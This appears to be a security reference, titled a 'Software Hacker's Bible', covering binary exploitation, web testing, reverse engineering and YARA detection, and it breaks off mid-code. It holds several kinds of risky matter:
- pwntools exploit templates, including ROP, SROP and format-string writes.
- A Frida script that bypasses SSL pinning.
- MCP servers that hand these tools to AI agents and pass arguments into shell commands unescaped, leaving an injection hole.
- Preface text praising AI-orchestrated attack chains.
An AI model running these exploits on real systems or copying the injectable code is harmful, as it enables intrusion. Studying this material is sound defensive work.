---
title: HiTECHCRIME-HARDWARE-BIBLE3
type: corpus
agent: worm
status: seed-imported
tags: [corpus, adversarial, reference]
---

# THE 2026 SOFTWARE HACKER'S BIBLE

## A Complete Operational Reference for Software Exploitation, Reverse Engineering, Vulnerability Research, Malware Analysis, and AI-Integrated Software Security Operations

---

# PREFACE

This is the software edition of the 2026 Cybercrime Bible. Where the Hardware edition went down to the metal — the PCBs, the firmware, the radio waves — this edition goes down to the logic. The bits, the bytes, the instructions, the protocols, the parsers, the memory layouts, the code paths.

It is designed for:
- **Software security researchers** who need to understand the full spectrum of exploitation techniques and tooling
- **Reverse engineers** who need to take apart binaries, firmware, and protocols
- **Malware analysts** who need to dissect malicious code
- **Vulnerability researchers** who need to find and exploit bugs before adversaries do
- **AI-first operators** who want to integrate LLM agents with software tooling via MCP, MHS, and custom orchestration
- **Defenders** who need to understand what they're up against in the software domain

Every section includes setup instructions, configuration details, code examples, and AI integration patterns. Where tools have specific workflows, those are covered. Where custom tooling is possible, the development process is outlined.

**The AI-First Mandate:** Software is the domain where AI integration is most mature and most powerful. AI agents can write exploits, analyze binaries, fuzz parsers, reverse protocols, and orchestrate entire attack chains. This document assumes that software tools are not used in isolation — they are integrated with AI agents via MCP servers, APIs, and custom harnesses. The code is the body; the AI is the brain.

**Legal Disclaimer:** The tools, techniques, and information in this document are provided for authorized security testing, research, and educational purposes only. Unauthorized use against systems you do not own or have explicit permission to test is illegal and unethical. Always obtain proper authorization before conducting any security assessment.

---

# PART ONE: THE SOFTWARE LANDSCAPE — EXPANDED

## Overview of Software Attack Surfaces and Tooling

---

## SECTION 1.1: MEMORY CORRUPTION & BINARY EXPLOITATION

### 1.1.1 Memory Corruption Fundamentals

| Vulnerability Class | Description | Modern Status | Exploitability |
|---------------------|-------------|---------------|----------------|
| **Stack Buffer Overflow** | Writing beyond stack buffer bounds | Rare (stack canaries) | Medium |
| **Heap Buffer Overflow** | Writing beyond heap buffer bounds | Common | High |
| **Use-After-Free (UAF)** | Using memory after it's freed | Very Common | High |
| **Double Free** | Freeing memory twice | Common | High |
| **Type Confusion** | Treating object as wrong type | Common (JS engines) | High |
| **Integer Overflow** | Arithmetic exceeding type bounds | Common | Medium |
| **Off-by-One** | Writing one byte past buffer | Common | Medium |
| **Format String** | Using user input as format string | Rare (mitigations) | High |
| **Null Pointer Dereference** | Accessing null pointer | Common | Low (DoS) |
| **Race Condition (TOCTOU)** | Time-of-check to time-of-use | Common | High |
| **Uninitialized Memory** | Using uninitialized variable | Common | Medium |
| **Out-of-Bounds Read** | Reading beyond buffer bounds | Very Common | Medium (info leak) |
| **Out-of-Bounds Write** | Writing beyond buffer bounds | Common | High |
| **Stack Clash** | Stack pointer manipulation | Rare (mitigations) | Medium |
| **Return-Oriented Programming** | Chaining existing code gadgets | Technique, not vuln | High |

---

### 1.1.2 Exploitation Mitigations & Bypasses

| Mitigation | Description | Bypass Techniques |
|------------|-------------|-------------------|
| **ASLR** | Address Space Layout Randomization | Info leak, brute force, partial overwrite, heap spray |
| **DEP/NX** | Data Execution Prevention | ROP, JOP, COP, ret2libc |
| **Stack Canaries** | Stack protection values | Info leak, brute force, canary bypass via fork |
| **SafeSEH** | Safe Structured Exception Handling | SEH overwrite, SafeSEH bypass |
| **SEHOP** | SEH Overwrite Protection | SEHOP bypass, other techniques |
| **CFG** | Control Flow Guard | CFG bypass, data-only attacks |
| **CET** | Control-flow Enforcement Technology | Shadow stack bypass (rare) |
| **PAC** | Pointer Authentication (ARM) | PAC bypass (difficult) |
| **MTE** | Memory Tagging Extension (ARM) | MTE bypass (very difficult) |
| **Shadow Stack** | Separate stack for return addresses | Shadow stack bypass (rare) |
| **KASLR** | Kernel ASLR | Info leak, side channels |
| **SMEP/SMAP** | Supervisor Mode Execution/Access Prevention | ROP, data-only attacks |
| **KPTI** | Kernel Page Table Isolation | Meltdown variants |
| **FORTIFY_SOURCE** | Compile-time buffer checks | Logic bugs, integer overflow |
| **RELRO** | Relocation Read-Only | GOT overwrite (partial RELRO), heap attacks |
| **Full RELRO** | Full Relocation Read-Only | GOT overwrite (rare), other targets |

---

### 1.1.3 Binary Exploitation Tools

| Tool | Platform | Purpose | Best For |
|------|----------|---------|----------|
| **pwntools** | Linux/macOS | Exploit development framework | CTF, exploit scripting |
| **ROPgadget** | Cross-platform | ROP gadget finder | ROP chain construction |
| **ropper** | Cross-platform | ROP gadget finder | ROP chain construction |
| **one_gadget** | Linux | One-shot RCE gadget finder | glibc exploitation |
| **libc-database** | Linux | libc offset database | libc version identification |
| **checksec** | Linux | Binary mitigation checker | Quick mitigation assessment |
| **gef** | Linux | GDB enhancement | GDB-based exploitation |
| **pwndbg** | Linux | GDB enhancement | GDB-based exploitation |
| **peda** | Linux | GDB enhancement | GDB-based exploitation |
| **radare2** | Cross-platform | Reverse engineering framework | Binary analysis |
| **rizin** | Cross-platform | Reverse engineering framework | Binary analysis (radare2 fork) |
| **Ghidra** | Cross-platform | Reverse engineering suite | Binary analysis |
| **IDA Pro** | Cross-platform | Disassembler/decompiler | Professional RE |
| **Binary Ninja** | Cross-platform | Disassembler/decompiler | Modern RE |
| **angr** | Linux | Symbolic execution | Automated exploitation |
| **z3** | Cross-platform | SMT solver | Constraint solving |
| **Manticore** | Linux | Symbolic execution | Smart contract analysis |
| **Triton** | Cross-platform | Dynamic binary analysis | Concolic execution |

---

### 1.1.4 pwntools Setup & Usage

**Installation:**

```bash
# Install pwntools
pip3 install pwntools

# Install additional dependencies
sudo apt install python3-dev libssl-dev libffi-dev build-essential
sudo apt install gdb gdbserver

# Verify installation
python3 -c "from pwn import *; print('pwntools installed')"
```

**Basic Exploit Template:**

```python
#!/usr/bin/env python3
"""
Basic pwntools exploit template
"""

from pwn import *

# Configuration
context.log_level = 'info'
context.arch = 'amd64'
context.os = 'linux'

# Binary path
BINARY = './vulnerable_binary'
LIBC = './libc.so.6'

# Load binary
elf = ELF(BINARY)
libc = ELF(LIBC) if os.path.exists(LIBC) else None

# Check mitigations
log.info(f"Architecture: {elf.arch}")
log.info(f"RELRO: {elf.relro}")
log.info(f"Canary: {elf.canary}")
log.info(f"NX: {elf.nx}")
log.info(f"PIE: {elf.pie}")

def start(argv=[], *a, **kw):
    """Start the binary"""
    if args.GDB:
        return gdb.debug([BINARY] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(args.HOST, args.PORT)
    else:
        return process([BINARY] + argv, *a, **kw)

gdbscript = '''
set pagination off
continue
'''.format(**locals())

def exploit():
    """Main exploit function"""
    p = start()
    
    # Your exploit here
    # Example: buffer overflow
    # payload = b'A' * 64
    # payload += p64(elf.symbols['win'])
    # p.sendline(payload)
    
    # Example: format string
    # p.sendline(b'%p ' * 20)
    
    # Example: ROP chain
    # rop = ROP(elf)
    # rop.call(elf.symbols['system'], [next(elf.search(b'/bin/sh'))])
    # payload = fit({64: rop.chain()})
    # p.sendline(payload)
    
    p.interactive()

if __name__ == "__main__":
    exploit()
```

**Advanced pwntools Techniques:**

```python
#!/usr/bin/env python3
"""
Advanced pwntools techniques
"""

from pwn import *

context.arch = 'amd64'
context.os = 'linux'

# ============================================================================
# ROP Chain Construction
# ============================================================================

elf = ELF('./binary')
rop = ROP(elf)

# Find gadgets
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
pop_rdx = rop.find_gadget(['pop rdx', 'ret'])[0]

# Build ROP chain
chain = b''
chain += p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts'])
chain += p64(elf.symbols['main'])

# ============================================================================
# Format String Exploitation
# ============================================================================

def format_string_write(addr, value, offset, p):
    """Write value to addr using format string"""
    # Write byte by byte
    for i in range(8):
        byte = (value >> (i * 8)) & 0xFF
        if byte == 0:
            continue
        p.sendline(f'%{byte}c%{offset + i}$hhn'.encode() + p64(addr + i))

# ============================================================================
# Heap Exploitation (tcache poisoning)
# ============================================================================

def tcache_poison(target_addr):
    """Tcache poisoning attack"""
    # Allocate chunks
    # Free chunk
    # Overwrite next pointer with target
    # Allocate again to get arbitrary write
    pass

# ============================================================================
# Shellcode Generation
# ============================================================================

shellcode = asm(shellcraft.amd64.sh())
shellcode = asm(shellcraft.amd64.linux.sh())

# ============================================================================
# SROP (Sigreturn-Oriented Programming)
# ============================================================================

frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = bin_sh_addr
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_addr

payload = p64(syscall_ret_gadget) + p64(15) + bytes(frame)

# ============================================================================
# Ret2csu (useful for limited gadgets)
# ============================================================================

def ret2csu(func_got, arg1, arg2, arg3):
    """ret2csu gadget exploitation"""
    # __libc_csu_init gadgets
    pop_rbx_rbp_r12_r13_r14_r15 = 0x40089a
    mov_rdx_r14_call = 0x400880
    
    chain = b''
    chain += p64(pop_rbx_rbp_r12_r13_r14_r15)
    chain += p64(0)  # rbx
    chain += p64(1)  # rbp
    chain += p64(func_got)  # r12
    chain += p64(arg3)  # r13
    chain += p64(arg2)  # r14
    chain += p64(arg1)  # r15
    chain += p64(mov_rdx_r14_call)
    chain += p64(0) * 7
    return chain

# ============================================================================
# Automatic Exploit Generation (with angr)
# ============================================================================

import angr
import claripy

def angr_exploit():
    """Automatic exploit generation with angr"""
    proj = angr.Project('./binary', auto_load_libs=False)
    
    # Create symbolic arguments
    arg1 = claripy.BVS('arg1', 100 * 8)
    state = proj.factory.entry_state(args=['./binary', arg1])
    
    # Create simulation manager
    simgr = proj.factory.simulation_manager(state)
    
    # Find address of win function, avoid failure
    find_addr = 0x400000 + 0x1234  # win function
    avoid_addr = 0x400000 + 0x5678  # failure
    
    # Explore
    simgr.explore(find=find_addr, avoid=avoid_addr)
    
    if simgr.found:
        found = simgr.found[0]
        solution = found.solver.eval(arg1, cast_to=bytes)
        return solution
    
    return None
```

---

### 1.1.5 GDB Enhancement Tools

**GEF (GDB Enhanced Features):**

```bash
# Install GEF
bash -c "$(curl -fsSL https://gef.blah.cat/sh)"

# Or manually
wget -O ~/.gdbinit-gef.py https://github.com/hugsy/gef/raw/main/gef.py
echo "source ~/.gdbinit-gef.py" >> ~/.gdbinit

# Usage
gdb ./binary
gef> checksec
gef> vmmap
gef> heap
gef> heap chunks
gef> heap bins
gef> telescope $rsp 20
gef> pattern create 100
gef> pattern search $rsp
gef> rop
gef> got
gef> xinfo
```

**pwndbg:**

```bash
# Install pwndbg
git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh

# Usage
gdb ./binary
pwndbg> checksec
pwndbg> vmmap
pwndbg> heap
pwndbg> bins
pwndbg> tcache
pwndbg> vis_heap_chunks
pwndbg> rop --grep "pop rdi"
pwndbg> search-pattern "AAAA"
```

**PEDA:**

```bash
# Install PEDA
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit

# Usage
gdb ./binary
gdb-peda$ checksec
gdb-peda$ vmmap
gdb-peda$ find "/bin/sh"
gdb-peda$ ropsearch "pop rdi"
gdb-peda$ pattern_create 100
gdb-peda$ pattern_offset "0x41414141"
```

---

## SECTION 1.2: WEB APPLICATION & API SECURITY

### 1.2.1 OWASP Top 10 (2026 Projected)

| Rank | Vulnerability | Description | Prevalence |
|------|--------------|-------------|------------|
| **A01** | Broken Access Control | Missing authorization checks | Very High |
| **A02** | Cryptographic Failures | Weak crypto, plaintext storage | High |
| **A03** | Injection | SQL, NoSQL, OS, LDAP, XPath | Very High |
| **A04** | Insecure Design | Architectural flaws | High |
| **A05** | Security Misconfiguration | Default configs, verbose errors | Very High |
| **A06** | Vulnerable Components | Outdated libraries, frameworks | Very High |
| **A07** | Authentication Failures | Weak auth, session management | High |
| **A08** | Software & Data Integrity Failures | Unsigned updates, insecure deserialization | High |
| **A09** | Logging & Monitoring Failures | Insufficient logging, no alerting | High |
| **A10** | Server-Side Request Forgery | SSRF to internal services | Medium-High |

---

### 1.2.2 Web Application Tools

| Tool | Purpose | Best For |
|------|---------|----------|
| **Burp Suite** | Web application testing | Comprehensive web testing |
| **OWASP ZAP** | Web application testing | Free alternative to Burp |
| **sqlmap** | SQL injection | Automated SQL injection |
| **NoSQLMap** | NoSQL injection | Automated NoSQL injection |
| **XSStrike** | XSS detection | Advanced XSS |
| **Commix** | Command injection | Automated command injection |
| **Wfuzz** | Web fuzzing | Parameter fuzzing |
| **ffuf** | Fast web fuzzing | Directory/parameter discovery |
| **gobuster** | Directory brute force | Directory/file discovery |
| **Nikto** | Web server scanner | Server misconfigurations |
| **nuclei** | Vulnerability scanner | Template-based scanning |
| **Amass** | Subdomain enumeration | Asset discovery |
| **Subfinder** | Subdomain enumeration | Passive subdomain discovery |
| **httpx** | HTTP toolkit | HTTP probing |
| **Katana** | Web crawler | Modern web crawling |
| **Arjun** | Parameter discovery | Hidden parameter discovery |

---

### 1.2.3 Burp Suite Setup & Usage

**Installation:**

```bash
# Download Burp Suite Community/Professional
# https://portswigger.net/burp/releases

# For Linux (Community)
chmod +x burpsuite_community_linux_*.sh
./burpsuite_community_linux_*.sh

# For Kali (pre-installed)
burpsuite
```

**Configuration:**

```bash
# Proxy setup
# 1. Options → Proxy → Options
# 2. Add proxy listener: 127.0.0.1:8080
# 3. Configure browser to use proxy

# SSL/TLS setup
# 1. Proxy → Options → Import/Export CA Certificate
# 2. Export certificate
# 3. Import into browser trusted certificates
```

**Extensions:**

| Extension | Purpose | BApp Store |
|-----------|---------|------------|
| **Logger++** | Advanced logging | Yes |
| **Autorize** | Authorization testing | Yes |
| **Turbo Intruder** | Fast request sending | Yes |
| **Collaborator Everywhere** | SSRF detection | Yes |
| **Backslash Powered Scanner** | Advanced scanning | Yes |
| **JWT Editor** | JWT testing | Yes |
| **Param Miner** | Parameter discovery | Yes |
| **Active Scan++** | Enhanced scanning | Yes |
| **Hackvertor** | Payload encoding | Yes |
| **JSON Web Tokens** | JWT analysis | Yes |

**Burp MCP Server:**

```python
#!/usr/bin/env python3
"""
Burp Suite MCP Server
Bridges Burp Suite to AI agents via Model Context Protocol
"""

import asyncio
import json
import subprocess
from mcp.server import Server, stdio_server
from mcp.types import Tool, TextContent

server = Server("burp-mcp")

@server.list_tools()
async def list_tools():
    return [
        Tool(name="burp_scan", description="Start a scan on a target"),
        Tool(name="burp_intruder", description="Run an intruder attack"),
        Tool(name="burp_repeater", description="Send a request to repeater"),
        Tool(name="burp_spider", description="Spider a target"),
        Tool(name="burp_proxy_history", description="Get proxy history"),
        Tool(name="burp_sitemap", description="Get target sitemap"),
        Tool(name="burp_issues", description="Get discovered issues"),
        Tool(name="burp_export", description="Export scan results"),
    ]

@server.call_tool()
async def call_tool(name: str, arguments: dict) -> list[TextContent]:
    if name == "burp_scan":
        result = await scan(arguments["url"])
    elif name == "burp_intruder":
        result = await intruder(arguments["request"], arguments["payloads"])
    elif name == "burp_repeater":
        result = await repeater(arguments["request"])
    elif name == "burp_spider":
        result = await spider(arguments["url"])
    elif name == "burp_proxy_history":
        result = await proxy_history()
    elif name == "burp_sitemap":
        result = await sitemap(arguments["url"])
    elif name == "burp_issues":
        result = await issues()
    elif name == "burp_export":
        result = await export(arguments["format"])
    else:
        result = f"Unknown tool: {name}"
    
    return [TextContent(type="text", text=result)]

async def scan(url):
    """Start a scan"""
    # Burp REST API
    cmd = f"curl -X POST http://127.0.0.1:1337/v0.1/scan -d '{{\"urls\":[\"{url}\"]}}'"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return result.stdout

async def intruder(request, payloads):
    """Run intruder attack"""
    # Implementation via Burp REST API
    return "Intruder attack started"

async def repeater(request):
    """Send request to repeater"""
    return "Request sent to repeater"

async def spider(url):
    """Spider target"""
    return f"Spidering {url}"

async def proxy_history():
    """Get proxy history"""
    return "Proxy history retrieved"

async def sitemap(url):
    """Get sitemap"""
    return f"Sitemap for {url}"

async def issues():
    """Get issues"""
    return "Issues retrieved"

async def export(format):
    """Export results"""
    return f"Exported in {format} format"

async def main():
    async with stdio_server() as (read_stream, write_stream):
        await server.run(read_stream, write_stream)

if __name__ == "__main__":
    asyncio.run(main())
```

---

### 1.2.4 API Security Testing

**API-Specific Vulnerabilities:**

| Vulnerability | Description | Detection |
|---------------|-------------|-----------|
| **BOLA** | Broken Object Level Authorization | Test object ID manipulation |
| **Broken Authentication** | Weak auth mechanisms | Test auth bypass, credential stuffing |
| **Broken Object Property Level Authorization** | Mass assignment, excessive data exposure | Test property injection |
| **Unrestricted Resource Consumption** | No rate limiting, resource exhaustion | Test high-volume requests |
| **Broken Function Level Authorization** | Missing function-level checks | Test admin endpoints |
| **Unrestricted Access to Sensitive Business Flows** | No flow controls | Test business logic abuse |
| **SSRF** | Server-side request forgery | Test URL parameters |
| **Security Misconfiguration** | Default configs, verbose errors | Test error handling |
| **Improper Inventory Management** | Shadow APIs, deprecated versions | Test old API versions |
| **Unsafe Consumption of APIs** | Third-party API trust | Test third-party integrations |

**API Testing Tools:**

| Tool | Purpose | Best For |
|------|---------|----------|
| **Postman** | API testing | Manual API testing |
| **Insomnia** | API testing | REST/GraphQL testing |
| **Bruno** | API testing | Open-source API client |
| **k6** | Load testing | API performance |
| **RESTler** | REST API fuzzing | Automated API fuzzing |
| **GraphQL Voyager** | GraphQL visualization | GraphQL schema visualization |
| **InQL** | GraphQL testing | GraphQL security |
| **Clair** | Container vulnerability | Container API security |

---

## SECTION 1.3: REVERSE ENGINEERING TOOLS & TECHNIQUES

### 1.3.1 Reverse Engineering Tool Comparison

| Tool | Type | Platform | Cost | Best For |
|------|------|----------|------|----------|
| **IDA Pro** | Disassembler/Decompiler | Cross-platform | $$$$ | Professional RE |
| **Ghidra** | Disassembler/Decompiler | Cross-platform | Free | NSA-grade RE |
| **Binary Ninja** | Disassembler/Decompiler | Cross-platform | $$ | Modern RE |
| **radare2** | RE Framework | Cross-platform | Free | CLI-based RE |
| **rizin** | RE Framework | Cross-platform | Free | radare2 fork |
| **Cutter** | GUI for radare2/rizin | Cross-platform | Free | GUI RE |
| **Hopper** | Disassembler | macOS/Linux | $$ | macOS RE |
| **objdump** | Disassembler | Linux | Free | Quick disassembly |
| **readelf** | ELF analysis | Linux | Free | ELF inspection |
| **nm** | Symbol listing | Linux | Free | Symbol analysis |
| **strings** | String extraction | Cross-platform | Free | Quick string analysis |
| **file** | File type identification | Cross-platform | Free | File identification |
| **xxd** | Hex dump | Cross-platform | Free | Hex analysis |
| **binwalk** | Firmware analysis | Cross-platform | Free | Firmware RE |
| **Frida** | Dynamic instrumentation | Cross-platform | Free | Runtime analysis |
| **x64dbg** | Debugger | Windows | Free | Windows debugging |
| **WinDbg** | Debugger | Windows | Free | Windows kernel debugging |
| **GDB** | Debugger | Linux | Free | Linux debugging |
| **LLDB** | Debugger | Cross-platform | Free | macOS debugging |

---

### 1.3.2 Ghidra Setup & Usage

**Installation:**

```bash
# Download Ghidra
wget https://github.com/NationalSecurityAgency/ghidra/releases/download/Ghidra_11.0.3_build/ghidra_11.0.3_PUBLIC_20240410.zip

# Extract
unzip ghidra_11.0.3_PUBLIC_20240410.zip
cd ghidra_11.0.3_PUBLIC

# Install Java (required)
sudo apt install openjdk-17-jdk

# Run Ghidra
./ghidraRun
```

**Ghidra Headless Analysis:**

```bash
# Headless analysis
./support/analyzeHeadless /tmp/ghidra_project MyProject \
  -import /path/to/binary \
  -postScript MyScript.java \
  -deleteProject

# Export decompiled code
./support/analyzeHeadless /tmp/ghidra_project MyProject \
  -import /path/to/binary \
  -postScript ExportDecompiled.java \
  -deleteProject
```

**Ghidra Scripting (Python/Java):**

```python
# Ghidra Python script (Jython)
# @category Analysis

from ghidra.program.model.symbol import SymbolType

def find_functions():
    """Find all functions in the binary"""
    functions = []
    fm = currentProgram.getFunctionManager()
    for func in fm.getFunctions(True):
        functions.append({
            'name': func.getName(),
            'address': func.getEntryPoint().toString(),
            'size': func.getBody().getNumAddresses()
        })
    return functions

def find_strings():
    """Find all strings in the binary"""
    strings = []
    listing = currentProgram.getListing()
    data = listing.getDefinedData(True)
    for d in data:
        if d.hasStringValue():
            strings.append({
                'address': d.getAddress().toString(),
                'value': d.getValue()
            })
    return strings

def find_xrefs_to(address):
    """Find cross-references to an address"""
    refs = []
    ref_manager = currentProgram.getReferenceManager()
    addr = currentProgram.getAddressFactory().getAddress(address)
    for ref in ref_manager.getReferencesTo(addr):
        refs.append({
            'from': ref.getFromAddress().toString(),
            'type': ref.getReferenceType().toString()
        })
    return refs

# Run analysis
functions = find_functions()
strings = find_strings()

print(f"Found {len(functions)} functions")
print(f"Found {len(strings)} strings")
```

**Ghidra MCP Server:**

```python
#!/usr/bin/env python3
"""
Ghidra MCP Server
Bridges Ghidra to AI agents via Model Context Protocol
"""

import asyncio
import subprocess
import json
from mcp.server import Server, stdio_server
from mcp.types import Tool, TextContent

server = Server("ghidra-mcp")

@server.list_tools()
async def list_tools():
    return [
        Tool(name="ghidra_decompile", description="Decompile a function"),
        Tool(name="ghidra_disassemble", description="Disassemble an address range"),
        Tool(name="ghidra_find_functions", description="List functions"),
        Tool(name="ghidra_find_strings", description="List strings"),
        Tool(name="ghidra_find_xrefs", description="Find cross-references"),
        Tool(name="ghidra_rename", description="Rename a symbol"),
        Tool(name="ghidra_comment", description="Add a comment"),
        Tool(name="ghidra_export", description="Export analysis"),
    ]

@server.call_tool()
async def call_tool(name: str, arguments: dict) -> list[TextContent]:
    if name == "ghidra_decompile":
        result = await decompile(arguments["function"])
    elif name == "ghidra_disassemble":
        result = await disassemble(arguments["start"], arguments["end"])
    elif name == "ghidra_find_functions":
        result = await find_functions()
    elif name == "ghidra_find_strings":
        result = await find_strings()
    elif name == "ghidra_find_xrefs":
        result = await find_xrefs(arguments["address"])
    elif name == "ghidra_rename":
        result = await rename(arguments["address"], arguments["name"])
    elif name == "ghidra_comment":
        result = await comment(arguments["address"], arguments["text"])
    elif name == "ghidra_export":
        result = await export(arguments["format"])
    else:
        result = f"Unknown tool: {name}"
    
    return [TextContent(type="text", text=result)]

async def decompile(function):
    """Decompile a function"""
    # Call Ghidra headless with decompile script
    cmd = f"ghidra_headless decompile --function {function}"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return result.stdout

async def disassemble(start, end):
    """Disassemble an address range"""
    cmd = f"ghidra_headless disassemble --start {start} --end {end}"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return result.stdout

async def find_functions():
    """List functions"""
    cmd = "ghidra_headless list-functions"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return result.stdout

async def find_strings():
    """List strings"""
    cmd = "ghidra_headless list-strings"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return result.stdout

async def find_xrefs(address):
    """Find cross-references"""
    cmd = f"ghidra_headless xrefs --address {address}"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return result.stdout

async def rename(address, name):
    """Rename a symbol"""
    cmd = f"ghidra_headless rename --address {address} --name {name}"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return result.stdout

async def comment(address, text):
    """Add a comment"""
    cmd = f"ghidra_headless comment --address {address} --text '{text}'"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return result.stdout

async def export(format):
    """Export analysis"""
    cmd = f"ghidra_headless export --format {format}"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return result.stdout

async def main():
    async with stdio_server() as (read_stream, write_stream):
        await server.run(read_stream, write_stream)

if __name__ == "__main__":
    asyncio.run(main())
```

---

### 1.3.3 Frida Setup & Usage

**Installation:**

```bash
# Install Frida tools
pip3 install frida-tools

# Install Frida server on target (Android example)
# Download frida-server from https://github.com/frida/frida/releases
adb push frida-server /data/local/tmp/
adb shell "chmod 755 /data/local/tmp/frida-server"
adb shell "/data/local/tmp/frida-server &"

# Verify
frida-ps -U
```

**Frida Scripting:**

```javascript
// Frida script for hooking functions
// Save as hook.js

// Hook a native function
var targetFunc = Module.findExportByName(null, 'target_function');
if (targetFunc) {
    Interceptor.attach(targetFunc, {
        onEnter: function(args) {
            console.log('[+] target_function called');
            console.log('    arg0: ' + args[0]);
            console.log('    arg1: ' + args[1]);
            
            // Modify arguments
            // args[0] = ptr('0x1234');
        },
        onLeave: function(retval) {
            console.log('[+] target_function returned: ' + retval);
            
            // Modify return value
            // retval.replace(ptr('0x1'));
        }
    });
}

// Hook a Java method (Android)
if (Java.available) {
    Java.perform(function() {
        var targetClass = Java.use('com.example.TargetClass');
        targetClass.targetMethod.implementation = function(arg) {
            console.log('[+] targetMethod called with: ' + arg);
            
            // Call original
            var result = this.targetMethod(arg);
            
            console.log('[+] targetMethod returned: ' + result);
            return result;
        };
    });
}

// Hook SSL verification (bypass)
if (Java.available) {
    Java.perform(function() {
        var TrustManager = Java.use('javax.net.ssl.X509TrustManager');
        var SSLContext = Java.use('javax.net.ssl.SSLContext');
        
        var TrustManagerImpl = Java.registerClass({
            name: 'com.example.TrustManagerImpl',
            implements: [TrustManager],
            methods: {
                checkClientTrusted: function(chain, authType) {},
                checkServerTrusted: function(chain, authType) {},
                getAcceptedIssuers: function() { return []; }
            }
        });
        
        var contexts = SSLContext.getInstances();
        for (var i = 0; i < contexts.length; i++) {
            var context = contexts[i];
            var trustManagers = [TrustManagerImpl.$new()];
            context.init(null, trustManagers, null);
        }
    });
}
```

**Frida CLI Usage:**

```bash
# List processes
frida-ps -U

# Attach to process
frida -U -n com.example.app -l hook.js

# Spawn and attach
frida -U -f com.example.app -l hook.js --no-pause

# Trace function calls
frida-trace -U -n com.example.app -i "open*"

# Dump memory
frida -U -n com.example.app -e "Memory.readByteArray(ptr('0x1234'), 100)"
```

---

## SECTION 1.4: MALWARE ANALYSIS PLATFORMS

### 1.4.1 Malware Analysis Tools

| Tool | Type | Platform | Purpose |
|------|------|----------|---------|
| **Volatility** | Memory forensics | Cross-platform | Memory analysis |
| **Rekall** | Memory forensics | Cross-platform | Memory analysis |
| **Autopsy** | Disk forensics | Cross-platform | Disk analysis |
| **Sleuth Kit** | Disk forensics | Cross-platform | Disk analysis |
| **YARA** | Pattern matching | Cross-platform | Malware identification |
| **Sigma** | Log analysis | Cross-platform | Detection rules |
| **Cuckoo** | Sandbox | Linux | Automated analysis |
| **CAPE** | Sandbox | Linux | Automated analysis |
| **Joe Sandbox** | Sandbox | Cloud | Automated analysis |
| **Any.Run** | Sandbox | Cloud | Interactive analysis |
| **Hybrid Analysis** | Sandbox | Cloud | Automated analysis |
| **VirusTotal** | Multi-engine scanning | Cloud | Malware identification |
| **PEStudio** | PE analysis | Windows | Static analysis |
| **Detect It Easy (DIE)** | Packer detection | Cross-platform | Packer identification |
| **Exeinfo PE** | Packer detection | Windows | Packer identification |
| **pestudio** | PE analysis | Windows | Static analysis |
| **CFF Explorer** | PE analysis | Windows | Static analysis |
| **PE-bear** | PE analysis | Windows | Static analysis |
| **HxD** | Hex editor | Windows | Binary analysis |
| **010 Editor** | Hex editor | Cross-platform | Binary analysis |
| **CyberChef** | Data manipulation | Web | Encoding/decoding |

---

### 1.4.2 YARA Rule Development

**YARA Setup:**

```bash
# Install YARA
sudo apt install yara

# Install yara-python
pip3 install yara-python

# Verify
yara --version
```

**YARA Rule Examples:**

```yara
/*
   YARA Rule: Detect Example Malware
   Author: Security Researcher
   Date: 2026-01-15
*/

rule Example_Malware {
    meta:
        description = "Detects Example Malware family"
        author = "Security Researcher"
        date = "2026-01-15"
        reference = "https://example.com/malware-analysis"
        hash = "d41d8cd98f00b204e9800998ecf8427e"
        
    strings:
        $s1 = "malicious_string" ascii
        $s2 = "another_string" wide
        $s3 = { 48 8B 05 ?? ?? ?? ?? 48 85 C0 74 }
        $s4 = /https?:\/\/[a-zA-Z0-9.-]+\/[a-zA-Z0-9]+/ 
        
    condition:
        uint16(0) == 0x5A4D and  // MZ header
        filesize < 1MB and
        2 of ($s*) and
        $s3 at 0x1000
}

rule Ransomware_Generic {
    meta:
        description = "Generic ransomware detection"
        
    strings:
        $ransom_note = "Your files have been encrypted"
        $btc_address = /[13][a-km-zA-HJ-NP-Z1-9]{25,34}/
        $tor_address = /[a-z2-7]{16}\.onion/
        $encrypt_ext = ".encrypted"
        
    condition:
        2 of them
}

rule Packer_UPX {
    meta:
        description = "Detects UPX packed binaries"
        
    strings:
        $upx1 = "UPX!"
        $upx2 = "UPX0"
        $upx3 = "UPX1"
        
    condition:
        any of them
}
```

**YARA CLI Usage:**

```bash
# Scan a file
yara rule.yar suspicious.exe

# Scan a directory
yara -r rule.yar /path/to/directory/

# Scan with multiple rules
yara rules/ suspicious.exe

# Output matching strings
yara -s rule.yar suspicious.exe

# Fast mode
yara -f rule.yar suspicious.exe

# Print tags
yara -g rule.yar suspicious.exe
```

**YARA Python Integration:**

```python
#!/usr/bin/env python3
"""
YARA Python Integration
"""

import yara
import os

def compile_rules(rule_path):
    """Compile YARA rules"""
    if os.path.isdir(rule_path):
        # Compile all rules in directory
        filepaths = {}
        for root, dirs, files in os.walk(rule_path):
            for file in files:
                if file.endswith('.yar') or file.endswith('.yara'):
                    filepath = os.path.join(root, file)
                    namespace = os.path.splitext(file)[0]
                    filepaths[namespace] = filepath
        return yara.compile(filepaths=filepaths)
    else:
        return yara.compile(filepath=rule_path)

def scan_file(rules, filepath):
    """Scan a file with YARA rules"""
    try:
        matches = rules.match(filepath)
        return matches
    except yara.Error as e:
        print(f"Error scanning {filepath}: {e}")
        return []

def scan_directory(rules, directory):
    """Scan a directory with YARA rules"""
    results = {}
    for root, dirs, files in os.walk(directory):
        for file in files:
            filepath = os.path.join(root, file)
            matches = scan_file(rules, filepath)
            if matches:
                results[filepath] = matches
    return results

if __name__ == "__main__":
    # Compile rules
